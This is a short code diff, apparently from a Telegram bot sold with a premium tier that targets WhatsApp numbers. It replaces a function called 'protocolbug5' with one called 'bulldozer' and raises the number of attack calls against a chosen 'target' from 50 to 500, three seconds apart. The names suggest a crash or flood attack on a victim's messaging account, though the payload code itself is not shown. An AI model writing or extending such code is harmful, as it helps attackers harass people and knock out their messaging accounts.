@@ -1438,8 +1438,8 @@ bot.command("pro", checkWhatsAppConnection, checkPremium, async ctx => {
 
   await prosesrespone(target, ctx);
 
-  for (let i = 0; i < 50; i++) {
-    await protocolbug5(target, true)
+  for (let i = 0; i < 500; i++) {
+    await bulldozer(target, true)
     await sleep(3000)
     
 }
